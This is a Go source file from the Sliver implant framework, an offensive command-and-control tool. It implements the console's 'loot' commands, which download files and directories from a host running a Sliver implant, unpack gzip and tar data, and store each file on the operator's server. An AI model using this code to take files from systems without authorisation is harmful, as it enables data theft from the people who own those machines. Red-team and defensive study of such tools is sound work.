package loot

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"path/filepath"
	"strings"

	"github.com/spf13/cobra"
	"google.golang.org/protobuf/proto"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
)

func ValidateLootFileType(lootFileTypeInput string, data []byte) clientpb.FileType {
	lootFileType, err := lootFileTypeFromHumanStr(lootFileTypeInput)
	if lootFileType == -1 || err != nil {
		if isText(data) {
			lootFileType = clientpb.FileType_TEXT
		} else {
			lootFileType = clientpb.FileType_BINARY
		}
	}

	return lootFileType
}

/*
Eventually this function needs to be refactored out, but we made the decision to
duplicate it for now
*/
func PerformDownload(remotePath string, fileName string, cmd *cobra.Command, con *console.SliverClient) (*sliverpb.Download, error) {
	ctrl := make(chan bool)
	con.SpinUntil(fmt.Sprintf("%s -> %s", fileName, "loot"), ctrl)
	download, err := con.Rpc.Download(context.Background(), &sliverpb.DownloadReq{
		Request: con.ActiveTarget.Request(cmd),
		Path:    remotePath,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		return nil, err
	}
	if download.Response != nil && download.Response.Async {
		con.AddBeaconCallback(download.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, download)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
			}
		})
		con.PrintAsyncResponse(download.Response)
	}

	if download.Response != nil && download.Response.Err != "" {
		return nil, fmt.Errorf("%s", download.Response.Err)
	}

	// Decode the downloaded data if required
	if download.Encoder == "gzip" {
		download.Data, err = new(encoders.Gzip).Decode(download.Data)
		if err != nil {
			return nil, fmt.Errorf("decoding failed %s", err)
		}
	}

	return download, nil
}

func CreateLootMessage(hostUUID string, fileName string, lootName string, lootFileType clientpb.FileType, data []byte) *clientpb.Loot {
	if lootName == "" {
		lootName = fileName
	}
	lootMessage := &clientpb.Loot{
		Name:           lootName,
		OriginHostUUID: hostUUID,
		FileType:       lootFileType,
		File: &commonpb.File{
			Name: fileName,
			Data: data,
		},
	}
	return lootMessage
}

func SendLootMessage(loot *clientpb.Loot, con *console.SliverClient) {
	control := make(chan bool)
	con.SpinUntil(fmt.Sprintf("Sending looted file (%s) to the server...", loot.Name), control)

	loot, err := con.Rpc.LootAdd(context.Background(), loot)
	control <- true
	<-control
	if err != nil {
		con.PrintErrorf("%s\n", err)
	}

	if loot.Name != loot.File.Name {
		con.PrintInfof("Successfully looted %s (%s) (ID: %s)\n", loot.File.Name, loot.Name, loot.ID)
	} else {
		con.PrintInfof("Successfully looted %s (ID: %s)\n", loot.Name, loot.ID)
	}
}

func LootDownload(download *sliverpb.Download, lootName string, fileType clientpb.FileType, cmd *cobra.Command, con *console.SliverClient) {
	// Was the download successful?
	if download.Response != nil && download.Response.Err != "" {
		con.PrintErrorf("%s\n", download.Response.Err)
		return
	}

	/*
		Construct everything needed to send the loot to the server
		If this is a directory, we will process each file individually
	*/

	// Let's handle the simple case of a file first
	if !download.IsDir {
		// filepath.Base does not deal with backslashes correctly in Windows paths, so we have to standardize the path to forward slashes
		downloadPath := strings.ReplaceAll(download.Path, "\\", "/")
		lootMessage := CreateLootMessage(con.ActiveTarget.GetHostUUID(), filepath.Base(downloadPath), lootName, fileType, download.Data)
		SendLootMessage(lootMessage, con)
	} else {
		// We have to decompress the gzip file first
		decompressedDownload, err := gzip.NewReader(bytes.NewReader(download.Data))
		if err != nil {
			con.PrintErrorf("Could not decompress downloaded data: %s", err)
			return
		}

		/*
			Directories are stored as tar-ed gzip archives.
			We have gotten rid of the gzip part, now we have to sort out the tar
		*/
		tarReader := tar.NewReader(decompressedDownload)

		// Keep reading until we reach the end
		for {
			entryHeader, err := tarReader.Next()
			if err == io.EOF {
				// We have reached the end of the tar archive
				break
			}

			if err != nil {
				// Something is wrong with this archive. Stop reading.
				break
			}

			if entryHeader == nil {
				/*
					If the entry is nil, skip it (not sure when this would happen,
						but we do not want to attempt operations on something that is nil)
				*/
				continue
			}

			if entryHeader.Typeflag == tar.TypeDir {
				// Keep going to dig into the directory
				continue
			}
			// The implant should have only shipped us files (the implant resolves symlinks)

			// Create a loot message for this file and ship it
			/* Using io.ReadAll because it reads until EOF. We have already read the header, so the next EOF should
			be the end of the file
			*/
			fileData, err := io.ReadAll(tarReader)
			if err == nil {
				lootMessage := CreateLootMessage(con.ActiveTarget.GetHostUUID(), filepath.Base(entryHeader.Name), lootName, fileType, fileData)
				SendLootMessage(lootMessage, con)
			}
		}
	}
}

func LootText(text string, lootName string, lootFileName string, fileType clientpb.FileType, con *console.SliverClient) {
	lootMessage := CreateLootMessage(con.ActiveTarget.GetHostUUID(), lootFileName, lootName, fileType, []byte(text))
	SendLootMessage(lootMessage, con)
}

func LootBinary(data []byte, lootName string, lootFileName string, fileType clientpb.FileType, con *console.SliverClient) {
	lootMessage := CreateLootMessage(con.ActiveTarget.GetHostUUID(), lootFileName, lootName, fileType, data)
	SendLootMessage(lootMessage, con)
}

// LootAddRemoteCmd - Add a file from the remote system to the server as loot
func LootAddRemoteCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}
	remotePath := args[0]
	fileName := filepath.Base(remotePath)
	name, _ := cmd.Flags().GetString("name")

	download, err := PerformDownload(remotePath, fileName, cmd, con)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	// Determine type based on download buffer
	fileType, _ := cmd.Flags().GetString("file-type")
	lootFileType := ValidateLootFileType(fileType, download.Data)
	LootDownload(download, name, lootFileType, cmd, con)
}
